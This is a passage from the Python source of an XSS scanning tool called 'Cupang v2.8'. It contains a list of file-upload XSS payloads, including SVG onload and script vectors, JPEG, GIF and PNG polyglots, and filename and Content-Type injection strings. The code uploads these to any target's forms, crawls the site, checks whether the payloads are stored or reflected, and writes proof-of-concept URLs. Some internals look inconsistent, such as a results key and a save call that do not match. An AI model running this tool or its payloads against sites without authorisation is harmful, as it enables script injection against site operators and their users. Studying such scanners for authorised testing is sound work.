                'name': 'SVG with onload alert',
                'filename': f'xss_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'{self.unique_id}\')"><circle cx="50" cy="50" r="40"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with onload console.log',
                'filename': f'test_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg" onload="console.log(\'{self.unique_id}\')"><circle cx="50" cy="50" r="40" fill="red"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with onload style change',
                'filename': f'style_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg" onload="document.body.style.background=\'red\';console.log(\'{self.unique_id}\')"><circle cx="50" cy="50" r="40"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with script tag alert',
                'filename': f'payload_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(\'{self.unique_id}\')</script><circle cx="50" cy="50" r="40"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with script console.log',
                'filename': f'poc_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><script>console.log(\'{self.unique_id}\')</script></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with image onerror',
                'filename': f'img_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(\'{self.unique_id}\')"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with foreignObject',
                'filename': f'foreign_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(\'{self.unique_id}\')"/></body></foreignObject></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with animate',
                'filename': f'anim_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(\'{self.unique_id}\')" attributeName="x"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with set',
                'filename': f'set_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(\'{self.unique_id}\')"/><circle cx="50" cy="50" r="40"/></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'SVG with foreignObject',
                'filename': f'foreign_{self.unique_id}.svg',
                'content': f'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(\'{self.unique_id}\')</script></body></foreignObject></svg>'.encode(),
                'mimetype': 'image/svg+xml'
            },
            {
                'name': 'HTML as image',
                'filename': f'test_{self.unique_id}.html',
                'content': f'<html><body><script>alert(\'{self.unique_id}\')</script></body></html>'.encode(),
                'mimetype': 'text/html'
            },
            {
                'name': 'HTML with img onerror',
                'filename': f'poc_{self.unique_id}.html',
                'content': f'<html><body><img src=x onerror="alert(\'{self.unique_id}\')"></body></html>'.encode(),
                'mimetype': 'text/html'
            },
            {
                'name': 'JPEG polyglot with SVG',
                'filename': f'test_{self.unique_id}.jpg',
                'content': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + f'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'{self.unique_id}\')"><circle cx="50" cy="50" r="40"/></svg>'.encode() + b'\xFF\xD9',
                'mimetype': 'image/jpeg'
            },
            {
                'name': 'GIF polyglot with script',
                'filename': f'test_{self.unique_id}.gif',
                'content': b'GIF89a' + f'<script>alert(\'{self.unique_id}\')</script>'.encode() + b'\x00;',
                'mimetype': 'image/gif'
            },
            {
                'name': 'PNG polyglot',
                'filename': f'test_{self.unique_id}.png',
                'content': b'\x89PNG\r\n\x1a\n' + f'<script>alert(\'{self.unique_id}\')</script>'.encode(),
                'mimetype': 'image/png'
            },
            {
                'name': 'Filename XSS - img tag',
                'filename': f'"><img src=x onerror=alert(\'{self.unique_id}\')>.jpg',
                'content': b'GIF89a\x01\x00\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;',
                'mimetype': 'image/gif'
            },
            {
                'name': 'Filename XSS - svg onload',
                'filename': f'"><svg onload=alert(\'{self.unique_id}\')>.jpg',
                'content': b'GIF89a\x01\x00\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;',
                'mimetype': 'image/gif'
            },
            {
                'name': 'Filename XSS - script tag',
                'filename': f'"><script>alert(\'{self.unique_id}\')</script><x a=".jpg',
                'content': b'GIF89a\x01\x00\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;',
                'mimetype': 'image/gif'
            },
            {
                'name': 'Content-Type XSS',
                'filename': f'test_{self.unique_id}.jpg',
                'content': b'GIF89a\x01\x00\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;',
                'mimetype': f'image/jpeg"><script>alert(\'{self.unique_id}\')</script>'
            }
        ]
        
        for vector in vectors:
            try:
                files = {
                    file_inputs[0]: (vector['filename'], io.BytesIO(vector['content']), vector['mimetype'])
                }
                
                data = {}
                for inp in form['inputs']:
                    if inp['type'] != 'file' and inp['type'] not in ['submit', 'button']:
                        data[inp['name']] = inp.get('value', '')
                
                if form['method'] == 'post':
                    response = self.session.post(form['action'], files=files, data=data, timeout=self.timeout)
                else:
                    response = self.session.get(form['action'], files=files, timeout=self.timeout)
                
                soup = BeautifulSoup(response.text, 'html.parser')
                uploaded_files = []
                
                # Search in img tags
                for img in soup.find_all('img'):
                    src = img.get('src', '')
                    if src:
                        uploaded_files.append(src)
                
                # Search in anchor tags
                for a in soup.find_all('a'):
                    href = a.get('href', '')
                    if href:
                        uploaded_files.append(href)
                
                # Search for strings that look like the filename we just uploaded
                for vector in vectors:
                    filename = vector['filename']
                    if filename in response.text:
                        # Try to extract URL around the filename
                        pattern = r'["\']([^"\']*/' + re.escape(filename) + r'[^"\']*)["\']'
                        matches = re.findall(pattern, response.text)
                        for m in matches:
                            uploaded_files.append(m)
                
                unique_uploaded = []
                for f in uploaded_files:
                    if any(ext in f.lower() for ext in ['.svg', '.jpg', '.jpeg', '.png', '.gif', '.html', '.htm']):
                        file_url = f if f.startswith('http') else urljoin(form['action'], f)
                        if file_url not in unique_uploaded:
                            unique_uploaded.append(file_url)
                
                for file_url in unique_uploaded:
                    try:
                        file_response = self.session.get(file_url, timeout=self.timeout)
                        file_content = file_response.text
                        
                        is_svg = '<svg' in file_content.lower() or 'xmlns="http://www.w3.org/2000/svg"' in file_content
                        has_xss = any(pattern in file_content.lower() for pattern in ['onload=', '<script', 'onerror=', 'alert(', 'console.log'])
                        has_unique_id = self.unique_id in file_content
                        
                        if (is_svg and has_xss) or has_unique_id:
                            time.sleep(0.5)
                            check_response = self.session.get(form['action'], timeout=self.timeout)
                            
                            is_stored = file_url in check_response.text or 'uploads/' in check_response.text
                            vuln_type = 'stored' if is_stored else 'reflected'
                            
                            context_parts = []
                            if is_svg:
                                context_parts.append('SVG file')
                            if 'onload=' in file_content:
                                context_parts.append('onload event')
                            if '<script' in file_content:
                                context_parts.append('script tag')
                            if 'onerror=' in file_content:
                                context_parts.append('onerror event')
                            
                            context = 'File Upload XSS: ' + ', '.join(context_parts) if context_parts else 'File Upload XSS'
                            
                            evidence = file_content[:200] if len(file_content) < 200 else file_content[:200] + '...'
                            
                            results.append({
                                'url': form['action'],
                                'param': f'File upload: {file_inputs[0]}',
                                'payload': f'{vector["name"]}: {vector["filename"]}',
                                'method': form['method'].upper(),
                                'type': vuln_type,
                                'context': context,
                                'evidence': f'Uploaded file accessible at: {file_url}\nContent: {evidence}'
                            })
                            
                            print(f"{Fore.GREEN}[+] File Upload XSS Found!")
                            print(f"    File: {file_url}")
                            print(f"    Type: {vuln_type.upper()}")
                            print(f"    Vector: {vector['name']}")
                            
                            return results  # Found one, stop
                    except Exception as e:
                        continue
                
                if self.unique_id in response.text:
                    vuln_info = self.detect_xss_in_response(response.text, vector['filename'], self.unique_id)
                    
                    if vuln_info['vulnerable']:
                        results.append({
                            'url': form['action'],
                            'param': f'File upload: {file_inputs[0]}',
                            'payload': f'{vector["name"]}: {vector["filename"]}',
                            'method': form['method'].upper(),
                            'type': 'reflected',
                            'context': f'File upload - {vuln_info["context"]}',
                            'evidence': vuln_info['evidence']
                        })
                        return results
            except Exception as e:
                continue
        
        return results
    
    def export_results(self, filename, format='txt'):
        """Export scan results to various formats"""
        all_vulns = (self.vulnerabilities['reflected'] + 
                    self.vulnerabilities['stored'] + 
                    self.vulnerabilities['dom_based'])
        
        if format == 'json':
            with open(filename, 'w') as f:
                json.dump({
                    'target': self.target_url,
                    'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'vulnerabilities': {
                        'reflected': self.vulnerabilities['reflected'],
                        'stored': self.vulnerabilities['stored'],
                        'dom_based': self.vulnerabilities['dom_based']
                    },
                    'total': len(all_vulns)
                }, f, indent=2)
        
        elif format == 'csv':
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Type', 'URL', 'Parameter', 'Method', 'Context', 'Payload'])
                for vuln_type, vulns in self.vulnerabilities.items():
                    for v in vulns:
                        writer.writerow([
                            vuln_type.upper(),
                            v.get('url', ''),
                            v.get('param', ''),
                            v.get('method', ''),
                            v.get('context', ''),
                            v.get('payload', '')
                        ])
        
        elif format == 'html':
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>XSS Scan Report - {urlparse(self.target_url).netloc}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        h1 {{ color: #d32f2f; }}
        .summary {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .vuln {{ background: #fff3e0; padding: 15px; margin: 10px 0; border-left: 4px solid #ff9800; border-radius: 4px; }}
        .vuln-critical {{ border-left-color: #d32f2f; background: #ffebee; }}
        pre {{ background: #263238; color: #aed581; padding: 10px; border-radius: 4px; overflow-x: auto; }}
        .badge {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }}
        .badge-reflected {{ background: #f44336; color: white; }}
        .badge-stored {{ background: #ff9800; color: white; }}
        .badge-dom {{ background: #9c27b0; color: white; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 XSS Scan Report</h1>
        <div class="summary">
            <strong>Target:</strong> {self.target_url}<br>
            <strong>Scan Date:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}<br>
            <strong>Total Vulnerabilities:</strong> {len(all_vulns)}
        </div>
"""
            for vuln_type, vulns in self.vulnerabilities.items():
                if vulns:
                    badge_class = f"badge-{vuln_type.split('_')[0]}"
                    html_content += f"<h2><span class='badge {badge_class}'>{vuln_type.upper().replace('_', ' ')}</span> ({len(vulns)} found)</h2>"
                    for i, v in enumerate(vulns, 1):
                        html_content += f"""
        <div class="vuln vuln-critical">
            <strong>#{i} - {v.get('param', 'N/A')}</strong><br>
            <strong>URL:</strong> {v.get('url', 'N/A')}<br>
            <strong>Method:</strong> {v.get('method', 'N/A')}<br>
            <strong>Context:</strong> {v.get('context', 'N/A')}<br>
            <strong>Payload:</strong><br>
            <pre>{html_lib.escape(v.get('payload', 'N/A'))}</pre>
        </div>
"""
            
            html_content += """
    </div>
</body>
</html>
"""
            with open(filename, 'w') as f:
                f.write(html_content)
        
        else:  
            self.save_results(filename)
    
    def crawl(self, url, depth=2):

        visited = set()
        queue = [(url, 0)]
        found_urls = set([url])
        
        print(f"{Fore.YELLOW}[*] Deep crawling (max depth: {depth})...")
        
        while queue:
            curr_url, curr_depth = queue.pop(0)
            if curr_url in visited or curr_depth > depth:
                continue
            
            visited.add(curr_url)
            try:
                response = self.session.get(curr_url, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                domain = urlparse(self.target_url).netloc
                for a in soup.find_all('a', href=True):
                    link = urljoin(curr_url, a['href'])
                    link_parsed = urlparse(link)
                    
                    if link_parsed.netloc == domain:

                        clean_link = urlunparse((link_parsed.scheme, link_parsed.netloc, link_parsed.path, 
                                               link_parsed.params, link_parsed.query, ''))
                        if clean_link not in found_urls:
                            found_urls.add(clean_link)
                            queue.append((clean_link, curr_depth + 1))
                            if self.verbose:
                                print(f"    [Crawler] Found: {clean_link}")
            except Exception:
                continue
        
        print(f"{Fore.GREEN}[+] Crawler found {len(found_urls)} unique URLs")
        return list(found_urls)

    def analyze_js_files(self, url, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        
        findings = []
        for script in scripts:
            js_url = urljoin(url, script['src'])
            try:
                js_content = self.session.get(js_url, timeout=self.timeout).text
                
                sinks = [r'eval\(', r'innerHTML', r'document\.write', r'setTimeout\(', r'setInterval\(']
                sources = [r'location\.hash', r'location\.search', r'document\.URL']
                
                found_sinks = [s for s in sinks if re.search(s, js_content)]
                found_sources = [s for s in sources if re.search(s, js_content)]
                
                if found_sinks and found_sources:
                    findings.append({
                        'url': js_url,
                        'sinks': found_sinks,
                        'sources': found_sources
                    })
                    print(f"{Fore.RED}[!] INSANE: Potential DOM XSS in JS file: {js_url}")
                    print(f"    Sinks: {', '.join(found_sinks)}")
                    print(f"    Sources: {', '.join(found_sources)}")
            except:
                continue
        return findings

    def scan(self):
        self.print_banner()
        
        print(f"{Fore.CYAN}[*] Target: {self.target_url}")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] Timeout: {self.timeout}s")
        print(f"{Fore.CYAN}[*] Unique ID: {self.unique_id}")
        
        start_time = time.time()
        
        if self.do_crawl:
            all_targets = self.crawl(self.target_url)
        else:

            print(f"{Fore.YELLOW}[*] Shallow crawling target page...")
            all_targets = [self.target_url]
            try:
                response = self.session.get(self.target_url, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                domain = urlparse(self.target_url).netloc
                
                for a in soup.find_all('a', href=True):
                    link = urljoin(self.target_url, a['href'])
                    link_parsed = urlparse(link)
                    if link_parsed.netloc == domain:
                        clean_link = urlunparse((link_parsed.scheme, link_parsed.netloc, link_parsed.path, 
                                               link_parsed.params, link_parsed.query, ''))
                        if clean_link not in all_targets:
                            all_targets.append(clean_link)
                print(f"{Fore.GREEN}[+] Found {len(all_targets)} endpoints on target page")
            except Exception as e:
                print(f"{Fore.RED}[!] Error during shallow crawl: {e}")
        
        for target_url in all_targets:
            print(f"\n{Fore.MAGENTA}[Target] Scanning: {target_url}")
            
            try:
                response = self.session.get(target_url, timeout=self.timeout)
                html_content = response.text
                print(f"{Fore.GREEN}[+] Page loaded ({len(html_content)} bytes)")
            except Exception as e:
                print(f"{Fore.RED}[!] Error loading {target_url}: {e}")
                continue

            forms = self.get_forms(target_url, html_content)
            url_params = self.get_url_parameters(target_url)

            if self.test_all:
                for cp in self.common_params:
                    if cp not in url_params:
                        url_params[cp] = 'test'

            js_findings = self.analyze_js_files(target_url, html_content)
            for finding in js_findings:
                self.vulnerabilities['dom_based'].append({
                    'url': finding['url'],
                    'param': 'JS Sink',
                    'method': 'JS_ANALYSIS',
                    'context': f"Sinks: {finding['sinks']}",
                    'evidence': f"Sources found in same file: {finding['sources']}"
                })

            print(f"{Fore.GREEN}[+] Found {len(forms)} form(s) and {len(url_params)} URL param(s)")

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []

                for param_name, param_value in url_params.items():
                    futures.append(executor.submit(self.test_reflected_xss_url, target_url, param_name, param_value))

                for form in forms:
                    futures.append(executor.submit(self.test_reflected_xss_form, form))

                    if self.test_all:
                        futures.append(executor.submit(self.test_stored_xss, form))

                    if any(inp['type'] == 'file' for inp in form['inputs']):
                        futures.append(executor.submit(self.test_file_upload_xss, form))

                futures.append(executor.submit(self.test_header_xss, target_url))

                futures.append(executor.submit(self.test_dom_based_xss, target_url))
                
                for future in as_completed(futures):
                    try:
                        results = future.result()
                        if results:
                            for result in results:
                                vuln_type = result.get('type', 'reflected')
                                if result not in self.vulnerabilities[vuln_type]:
                                    self.vulnerabilities[vuln_type].append(result)
                                    print(f"\n{Fore.RED}[!] {vuln_type.upper()} XSS FOUND!")
                                    print(f"{Fore.RED}    URL: {result['url']}")
                                    print(f"{Fore.RED}    Param: {result['param']}")
                                    print(f"{Fore.RED}    Context: {result['context']}")
                    except Exception:
                        continue

        elapsed_time = time.time() - start_time
        self.print_summary(elapsed_time)
        self.save_results()
    
    def print_summary(self, elapsed_time):
        total_vulns = (len(self.vulnerabilities['reflected']) + 
                      len(self.vulnerabilities['stored']) +
                      len(self.vulnerabilities['file_upload']) + 
                      len(self.vulnerabilities['dom_based']))
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}[*] SCAN COMPLETE!")
        print(f"{Fore.CYAN}[*] Time: {elapsed_time:.2f}s")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        print(f"{Fore.YELLOW}Summary:")
        print(f"  - Reflected XSS: {len(self.vulnerabilities['reflected'])}")
        print(f"  - Stored XSS: {len(self.vulnerabilities['stored'])}")
        print(f"  - File Upload XSS: {len(self.vulnerabilities['file_upload'])}")
        print(f"  - DOM-based XSS: {len(self.vulnerabilities['dom_based'])}")
        print(f"  - Total: {total_vulns}\n")
        
        if total_vulns > 0:
            print(f"{Fore.RED}[!] Target is VULNERABLE to XSS!\n")
        else:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities found.\n")
    
    def get_working_payload(self, payload, context):

        return [payload]
    
    def save_results(self):

        if not any(self.vulnerabilities.values()):
            return
        
        parsed = urlparse(self.target_url)
        domain = parsed.netloc.replace(':', '_')  # Replace : with _ for ports
        if not domain:
            domain = 'unknown'
        
        cwd = os.getcwd()
        
        counter = 0
        while True:
            if counter == 0:
                txt_file = os.path.join(cwd, f'xss-{domain}.txt')
            else:
                txt_file = os.path.join(cwd, f'xss-{domain}-{counter}.txt')
            
            if not os.path.exists(txt_file):
                break
            counter += 1
        
        with open(txt_file, 'w') as f:
            f.write(f"XSS Scan Results\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"="*70 + "\n\n")
            
            total_vulns = sum(len(vulns) for vulns in self.vulnerabilities.values())
            f.write(f"Total Vulnerabilities: {total_vulns}\n\n")
            
            for xss_type, vulns in self.vulnerabilities.items():
                if vulns:
                    f.write(f"\n{'='*70}\n")
                    display_type = xss_type.replace('_', ' ').upper()
                    f.write(f"{display_type} XSS ({len(vulns)} found)\n")
                    f.write(f"{'='*70}\n\n")
                    
                    for i, vuln in enumerate(vulns, 1):
                        if 'field' in vuln:
                            f.write(f"{i}. File Upload Field: {vuln['field']}\n")
                            f.write(f"   File: {vuln['file']}\n")
                            f.write(f"   Method: {vuln['method']}\n")
                            f.write(f"   Payload: {vuln.get('payload', 'XSS in file metadata')}\n")
                            if vuln.get('uploaded_url'):
                                f.write(f"   Uploaded URL: {vuln['uploaded_url']}\n")
                        else:
                            f.write(f"{i}. Parameter: {vuln['param']}\n")
                            f.write(f"   Method: {vuln['method']}\n")
                            f.write(f"   Context: {vuln['context']}\n")
                            
                            payload = vuln.get('payload', 'N/A')
                            if 'payloads' in vuln and len(vuln['payloads']) > 1:
                                working_payloads = vuln['payloads']
                            elif payload != 'N/A':
                                working_payloads = self.get_working_payload(payload, vuln['context'])
                            else:
                                working_payloads = ["N/A (Analysis-based)"]
                            
                            if len(working_payloads) == 1:
                                f.write(f"   Payload: {working_payloads[0]}\n")
                            else:
                                f.write(f"   Working Payloads:\n")
                                for wp in working_payloads:
                                    f.write(f"      - {wp}\n")
                            
                            if vuln['method'] == 'GET' and payload != 'N/A':
                                parsed_url = urlparse(vuln['url'])
                                params = parse_qs(parsed_url.query)
                                
                                if vuln['param'] in params:
                                    params[vuln['param']] = [working_payloads[0]]
                                    new_query = urlencode(params, doseq=True)
                                    poc_url = urlunparse((
                                        parsed_url.scheme,
                                        parsed_url.netloc,
                                        parsed_url.path,
                                        parsed_url.params,
                                        new_query,
                                        parsed_url.fragment
                                    ))
                                    f.write(f"   PoC URL: {poc_url}\n")
                        
                        f.write("\n")
        
        print(f"{Fore.GREEN}[+] Results saved: {txt_file}")
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}[*] DETAILED RESULTS:")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        with open(txt_file, 'r') as f:
            content = f.read()
            print(content)
        
        return txt_file


def main():
    parser = argparse.ArgumentParser(
        description='Cupang v2.8 - Lightweight & Powerful XSS Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s https://example.com                        # Fast scan (top payloads)
  %(prog)s https://example.com -a                     # Test ALL payloads (comprehensive)
  %(prog)s https://example.com -H "Cookie: session=abc123"
  %(prog)s https://example.com -a -v                  # Verbose + all payloads
        '''
    )
    
    parser.add_argument('target_url', help='Target URL to scan')
    parser.add_argument('-a', '--all', action='store_true', dest='test_all',
                        help='Test with ALL payloads (slower but comprehensive)')
    parser.add_argument('--crawl', action='store_true', help='Perform deep crawling to find more endpoints')
    parser.add_argument('-H', '--header', action='append', dest='headers', 
                        help='Add custom header (format: "Key: Value")')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10s)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    custom_headers = {}
    if args.headers:
        for header_str in args.headers:
            if ':' in header_str:
                key, value = header_str.split(':', 1)
                custom_headers[key.strip()] = value.strip()
    
    scanner = UniversalXSSScanner(
        target_url=args.target_url,
        threads=args.threads,
        timeout=args.timeout,
        test_all=args.test_all,
        custom_headers=custom_headers,
        verbose=args.verbose,
        do_crawl=args.crawl
    )
    
    scanner.scan()


if __name__ == '__main__':
    main()
